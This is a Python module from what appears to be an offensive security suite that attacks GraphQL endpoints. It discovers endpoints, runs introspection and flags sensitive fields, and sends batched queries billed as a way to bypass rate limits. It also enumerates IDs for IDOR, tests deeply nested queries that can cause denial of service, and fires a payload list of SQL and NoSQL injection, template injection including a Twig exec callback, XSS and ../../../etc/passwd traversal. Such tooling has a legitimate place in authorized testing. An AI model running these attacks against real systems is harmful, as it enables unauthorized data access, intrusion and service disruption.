"""
TeamCyberOps Suite v4 — GraphQL Security Tester
Full GraphQL attack suite: introspection, batching, IDOR, injection
Pure Python — no external dependencies
"""
import json, re, time, urllib.request, urllib.parse
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).parent.parent.parent
LOGS_DIR = BASE_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)


# ══════════════════════════════════════════════════════════════
#  GRAPHQL ENDPOINT DETECTION
# ══════════════════════════════════════════════════════════════

GQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/gql", "/query", "/api/query", "/graphql/v1",
    "/graphiql", "/playground", "/api", "/api/v1",
    "/graph", "/api/graph", "/data", "/api/data",
]

def detect_endpoint(base_url: str, log_cb=None) -> list:
    """Find GraphQL endpoints on a target."""
    found = []
    base  = base_url.rstrip('/')
    log   = log_cb or print

    # Test query
    test_query = '{"query":"{ __typename }"}'

    for path in GQL_PATHS:
        url = base + path
        try:
            req = urllib.request.Request(
                url, data=test_query.encode(),
                headers={"Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode("utf-8", errors="replace")
                if any(k in body for k in ('"data":', '"errors":', '__typename')):
                    log(f"  [+] GraphQL endpoint: {url}", "ok")
                    found.append({"url": url, "response_preview": body[:100]})
        except urllib.error.HTTPError as e:
            body = e.read(100).decode("utf-8", errors="replace")
            if any(k in body for k in ('"errors":', 'GraphQL')):
                found.append({"url": url, "status": e.code,
                               "response_preview": body[:100]})
        except Exception:
            pass
    return found


# ══════════════════════════════════════════════════════════════
#  GRAPHQL REQUESTER
# ══════════════════════════════════════════════════════════════

def gql_request(endpoint: str, query: str,
                variables: dict = None,
                headers: dict = None,
                operation: str = None) -> dict:
    """Send a GraphQL request."""
    payload = {"query": query}
    if variables:  payload["variables"] = variables
    if operation:  payload["operationName"] = operation

    data = json.dumps(payload).encode()
    hdrs = {"Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0", **(headers or {})}
    try:
        req = urllib.request.Request(endpoint, data=data, headers=hdrs)
        with urllib.request.urlopen(req, timeout=15) as r:
            resp_body = r.read().decode("utf-8", errors="replace")
            try:
                resp_json = json.loads(resp_body)
            except Exception:
                resp_json = {"raw": resp_body}
            return {"ok": True, "status": r.status,
                    "data": resp_json, "raw": resp_body[:2000]}
    except urllib.error.HTTPError as e:
        body = e.read(500).decode("utf-8", errors="replace")
        try: body_json = json.loads(body)
        except Exception: body_json = {"raw": body}
        return {"ok": False, "status": e.code, "data": body_json, "raw": body[:2000]}
    except Exception as ex:
        return {"ok": False, "error": str(ex)}


# ══════════════════════════════════════════════════════════════
#  INTROSPECTION
# ══════════════════════════════════════════════════════════════

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}
"""

def run_introspection(endpoint: str, headers: dict = None) -> dict:
    """Run full introspection and parse schema."""
    r = gql_request(endpoint, INTROSPECTION_QUERY, headers=headers)
    if not r.get("ok") or "error" in r:
        # Try minimal introspection (introspection might be restricted)
        minimal = '{"query":"{ __schema { queryType { name } types { name kind } } }"}'
        try:
            req = urllib.request.Request(
                endpoint, data=minimal.encode(),
                headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = json.loads(resp.read())
                r = {"ok": True, "data": data, "restricted": True}
        except Exception:
            pass

    schema = r.get("data", {}).get("data", {}).get("__schema", {})
    types  = schema.get("types", [])

    # Extract useful info
    queries    = []
    mutations  = []
    user_types = []
    sensitive_fields = []

    for t in types:
        name = t.get("name", "")
        kind = t.get("kind", "")
        if name.startswith("__"): continue  # skip built-in

        if kind == "OBJECT":
            user_types.append(name)
            for field in t.get("fields", []) or []:
                fname = field.get("name", "")
                # Flag sensitive fields
                if any(s in fname.lower() for s in
                       ("password", "secret", "token", "key", "admin",
                        "credit", "ssn", "private", "internal")):
                    sensitive_fields.append(f"{name}.{fname}")

    qt = schema.get("queryType", {})
    if qt:
        root_query = next((t for t in types if t.get("name") == qt.get("name")), {})
        queries = [f.get("name","") for f in (root_query.get("fields",[]) or [])]

    mt = schema.get("mutationType", {})
    if mt:
        root_mut = next((t for t in types if t.get("name") == mt.get("name")), {})
        mutations = [f.get("name","") for f in (root_mut.get("fields",[]) or [])]

    return {
        "introspection_enabled": bool(schema),
        "types":             user_types,
        "queries":           queries,
        "mutations":         mutations,
        "sensitive_fields":  sensitive_fields,
        "schema":            schema,
        "raw_response":      r.get("raw", "")[:500],
    }


# ══════════════════════════════════════════════════════════════
#  ATTACK MODULES
# ══════════════════════════════════════════════════════════════

def test_batching_attack(endpoint: str, query: str,
                          n: int = 100,
                          headers: dict = None) -> dict:
    """
    GraphQL batching attack — send N queries in one request.
    Bypasses rate limiting on individual queries.
    """
    batch = [{"query": query} for _ in range(n)]
    data  = json.dumps(batch).encode()
    hdrs  = {"Content-Type": "application/json",
              "User-Agent": "Mozilla/5.0", **(headers or {})}
    start = time.time()
    try:
        req = urllib.request.Request(endpoint, data=data, headers=hdrs)
        with urllib.request.urlopen(req, timeout=30) as r:
            elapsed = (time.time() - start) * 1000
            body    = r.read().decode("utf-8", errors="replace")
            try: resp = json.loads(body)
            except Exception: resp = []
            responses_count = len(resp) if isinstance(resp, list) else 1
            return {
                "ok":             True,
                "batched":        n,
                "responses":      responses_count,
                "elapsed_ms":     round(elapsed, 1),
                "rate_limited":   responses_count < n,
                "vulnerable":     responses_count >= n,
                "message":        (f"🔴 BATCHING WORKS! {responses_count} responses for {n} queries"
                                   if responses_count >= n else
                                   f"Batching limited: only {responses_count}/{n} responses"),
            }
    except Exception as e:
        return {"ok": False, "error": str(e)}


def test_idor_via_graphql(endpoint: str,
                           query_template: str,
                           id_range: range = None,
                           headers: dict = None) -> dict:
    """
    Test IDOR by iterating IDs in GraphQL queries.
    query_template example: 'query { user(id: ID) { name email role } }'
    """
    found = []
    id_range = id_range or range(1, 21)

    for id_val in id_range:
        query = query_template.replace("ID", str(id_val))
        r     = gql_request(endpoint, query, headers=headers)
        data  = r.get("data", {}).get("data", {})
        errors = r.get("data", {}).get("errors", [])
        # Check if we got real data
        if data and data != {} and not all(v is None for v in data.values()):
            found.append({"id": id_val, "data": data})
        if errors:
            for e in errors:
                if "not found" in str(e).lower():
                    pass  # skip not-found
                elif "permission" in str(e).lower() or "auth" in str(e).lower():
                    found.append({"id": id_val, "auth_error": str(e)})

    return {
        "tested_ids":   list(id_range),
        "found":        found,
        "count":        len(found),
        "vulnerable":   len(found) > 0,
        "message":      (f"🔴 IDOR via GraphQL: {len(found)} records accessible!"
                         if found else "No IDOR found in tested range"),
    }


def test_injection_in_args(endpoint: str,
                            query_template: str,
                            headers: dict = None) -> dict:
    """Test for injection vulnerabilities in GraphQL arguments."""
    payloads = {
        "sqli_basic":      "' OR '1'='1",
        "sqli_comment":    "admin'--",
        "sqli_union":      "1 UNION SELECT 1,2,3--",
        "nosqli_ne":       '{"$ne": null}',
        "nosqli_gt":       '{"$gt": ""}',
        "nosqli_regex":    '{"$regex": ".*"}',
        "ssti_jinja":      "{{7*7}}",
        "ssti_twig":       "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}",
        "xss_basic":       '<script>alert(1)</script>',
        "path_traversal":  "../../../etc/passwd",
        "null_byte":       "test\x00admin",
    }
    results = {}
    for name, payload in payloads.items():
        query = query_template.replace("PAYLOAD", payload)
        r     = gql_request(endpoint, query, headers=headers)
        raw   = r.get("raw", "")
        # Detect signs of injection
        indicators = {
            "sql_error":     any(k in raw.lower() for k in
                                 ("syntax error", "sql", "ora-", "mysql")),
            "reflected":     payload in raw,
            "eval_result":   "49" in raw and "7*7" in payload,
            "file_content":  "root:" in raw or "bin/sh" in raw,
            "nosql_bypass":  '"data"' in raw and '{}' not in raw and '{"$' in payload,
        }
        if any(indicators.values()):
            results[name] = {"vulnerable": True, "payload": payload,
                              "indicators": indicators,
                              "response_preview": raw[:200]}
    return {"results": results, "vulnerable_count": len(results),
            "vulnerable": len(results) > 0}


def test_depth_limit(endpoint: str, max_depth: int = 15,
                     headers: dict = None) -> dict:
    """Test if server enforces query depth limits."""
    results = []
    for depth in [3, 5, 7, 10, 15, 20, 50]:
        # Build deeply nested query
        nested = "user { friends { friends { "
        nested += "friends { " * max(0, depth - 3)
        nested += "name " + "}" * max(0, depth - 1) + " } }"
        query  = f"query {{ {nested} }}"
        r      = gql_request(endpoint, query, headers=headers)
        errors = r.get("data", {}).get("errors", [])
        depth_limited = any("depth" in str(e).lower() or
                            "complexity" in str(e).lower()
                            for e in errors)
        results.append({"depth": depth,
                         "depth_limited": depth_limited,
                         "error": bool(errors)})
        if not depth_limited and depth >= 10:
            break
    unlimited = [r for r in results if not r["depth_limited"] and not r["error"]]
    return {"results": results,
            "depth_unlimited": bool(unlimited),
            "max_unconstrained_depth": max((r["depth"] for r in unlimited), default=0),
            "message": ("⚠ No depth limit — DoS via deeply nested queries possible"
                        if unlimited else "✅ Depth limiting appears configured")}


def test_field_suggestions(endpoint: str, headers: dict = None) -> dict:
    """Check if server exposes field name suggestions (info disclosure)."""
    typo_query = '{"query":"{ usr { nm em } }"}'
    try:
        req = urllib.request.Request(
            endpoint, data=typo_query.encode(),
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode("utf-8", errors="replace")
        suggestions = re.findall(r'"Did you mean[^"]*"', body)
        if suggestions:
            return {"suggestions_enabled": True,
                    "suggestions": suggestions,
                    "severity": "MEDIUM",
                    "message": "Field name suggestions exposed — schema enumerable without introspection"}
        return {"suggestions_enabled": False}
    except Exception as e:
        return {"error": str(e)}


# ══════════════════════════════════════════════════════════════
#  FULL AUDIT
# ══════════════════════════════════════════════════════════════

def full_audit(endpoint: str, headers: dict = None,
               log_cb=None) -> dict:
    """Run complete GraphQL security audit."""
    log = log_cb or print
    results = {"endpoint": endpoint, "timestamp": datetime.now().isoformat(),
               "findings": []}

    log(f"[*] GraphQL audit: {endpoint}", "info")

    # 1. Introspection
    log("[*] Testing introspection...", "info")
    intro = run_introspection(endpoint, headers)
    if intro.get("introspection_enabled"):
        results["findings"].append({"severity": "MEDIUM",
                                     "title": "Introspection Enabled",
                                     "detail": f"Found {len(intro.get('types',[]))} types, "
                                               f"{len(intro.get('queries',[]))} queries, "
                                               f"{len(intro.get('mutations',[]))} mutations"})
        if intro.get("sensitive_fields"):
            results["findings"].append({"severity": "HIGH",
                                         "title": "Sensitive Fields Exposed",
                                         "detail": f"Fields: {', '.join(intro['sensitive_fields'][:10])}"})
    results["introspection"] = intro

    # 2. Batching
    log("[*] Testing query batching...", "info")
    batching = test_batching_attack(endpoint, '{"query":"{ __typename }"}',
                                     n=10, headers=headers)
    if batching.get("vulnerable"):
        results["findings"].append({"severity": "HIGH",
                                     "title": "Query Batching Enabled",
                                     "detail": "Can bypass rate limiting via batch queries"})
    results["batching"] = batching

    # 3. Field suggestions
    log("[*] Testing field suggestions...", "info")
    sugg = test_field_suggestions(endpoint, headers)
    if sugg.get("suggestions_enabled"):
        results["findings"].append({"severity": "MEDIUM",
                                     "title": "Field Suggestions Exposed",
                                     "detail": str(sugg.get("suggestions",""))[:100]})
    results["field_suggestions"] = sugg

    # 4. Depth limit
    log("[*] Testing depth limits...", "info")
    depth = test_depth_limit(endpoint, headers=headers)
    if depth.get("depth_unlimited"):
        results["findings"].append({"severity": "MEDIUM",
                                     "title": "No Query Depth Limit",
                                     "detail": "Vulnerable to DoS via deeply nested queries"})
    results["depth_limit"] = depth

    results["total_findings"] = len(results["findings"])
    log(f"[+] Audit complete: {len(results['findings'])} findings", "ok")

    # Save
    proj_dir = LOGS_DIR / "graphql_audits"
    proj_dir.mkdir(exist_ok=True)
    fname = f"graphql_{int(time.time())}.json"
    try:
        with open(proj_dir / fname, 'w') as f:
            json.dump(results, f, indent=2, default=str)
    except Exception: pass

    return results
